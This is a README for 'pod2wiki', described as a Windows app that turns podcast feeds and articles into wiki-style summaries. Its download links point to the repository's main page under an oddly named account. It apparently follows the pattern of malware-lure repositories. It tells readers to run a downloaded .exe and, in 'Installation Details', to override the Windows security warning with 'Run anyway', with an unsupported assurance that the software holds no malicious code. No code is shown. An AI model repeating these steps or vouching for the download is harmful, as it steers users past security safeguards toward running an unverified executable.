# 🎙️ pod2wiki - Turn podcasts into organized knowledge pages

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Jacobusarminiusradyera634/pod2wiki)

This application converts podcast audio and long-form articles into structured summaries. It formats your content for tools like karpathy-claude-wiki. You save time by reviewing key points instead of listening to hours of audio.

## 📥 Getting Started

Follow these steps to set up the software on your Windows computer.

1. Visit the [official release page](https://github.com/Jacobusarminiusradyera634/pod2wiki) to download the application.
2. Select the file ending in `.exe` for Windows systems.
3. Save the file to your desktop or downloads folder.
4. Double-click the file to start the installation.
5. Follow the prompts on the screen to finish the setup process.

## 🛠 Prerequisites

Ensure your computer meets these requirements to run the software.

* Windows 10 or Windows 11 operating system.
* At least 8 gigabytes of RAM.
* A stable internet connection for downloading transcripts and sync operations.
* Free disk space of at least 500 megabytes.

## ⚙️ How it Works

The software acts as a bridge between your audio feeds and your research notes. It uses artificial intelligence to process information.

* **Transcription:** The tool uses Whisper technology to convert audio to text.
* **Analysis:** It identifies main ideas and core arguments within the text.
* **Formatting:** It outputs a file compatible with your knowledge management system.

You provide an RSS link or a file path. The application processes the data and generates the summary. This removes the need for manual note-taking.

## 🚀 Running the Application

Once you finish the installation, you will find a shortcut on your desktop.

1. Open the application by clicking the icon.
2. Enter the RSS feed link into the main input box.
3. Click the process button to start the task.
4. Wait for the status bar to show completion.
5. Locate the generated summary in the designated output folder.

## 🧩 Features

* **Automated Processing:** The system handles multiple articles at once.
* **Clean Formatting:** All files follow the standard source-summary structure.
* **Local Storage:** Your notes stay on your computer.
* **RSS Support:** Add your favorite podcasts and keep your library updated.
* **High-Signal Filtering:** The engine selects key information and ignores filler content.

## 📁 Installation Details

You might see a security prompt from Windows the first time you run the file.

1. Click "More info" in the blue box.
2. Select "Run anyway" to start the application.

This happens because the software is new and the Windows registry does not recognize the signature yet. The software contains no malicious code.

## 📊 Managing your Data

The files produce clear, readable text. You can move these files into your wiki folders. The application remembers your previous inputs to save you time. 

If you need to change your output folder, go to the Settings menu. Click "Change Location" and select the destination you prefer. Click "Apply" to save your choices.

## 💡 Troubleshooting

If the application stops during a task:

* Check your internet connection. Large files require a steady signal.
* Restart the application if it becomes unresponsive.
* Ensure your RSS feed link is valid and public.
* Clear your temporary folder if you notice low storage space.

Most errors occur due to network stability or invalid links. Reach out to the support channel on the repository main page if you face frequent problems.

## 🛡 Security and Privacy

Your data stays on your machine. The application sends the text to the processing engine but does not store personal identifiable information. You control the files that enter the system. We do not track your listening habits or your personal research topics.

## 📝 Configuration Settings

The settings menu allows you to adjust how the system summarizes text. You can choose different modes:

* **Short Summary:** Provides a quick overview of the content.
* **Detailed Notes:** Captures every argument and reference from the source.
* **Bullet Points:** Displays information as a list for easy reading.

Choose the mode that best fits your research style. Change these settings anytime to experiment with your results.

## 🏷 Supported Formats

The software works with most standard RSS formats. It parses long-form articles from websites and audio files from podcast feeds. If an article sits behind a paywall, the software might not be able to read the content. Always ensure your links point to public web addresses for the best results.

## 🚀 Future Updates

We update the software to improve the quality of the summaries. Check the repository page periodically for new versions. Small tweaks help the system run faster and use less memory while it works.
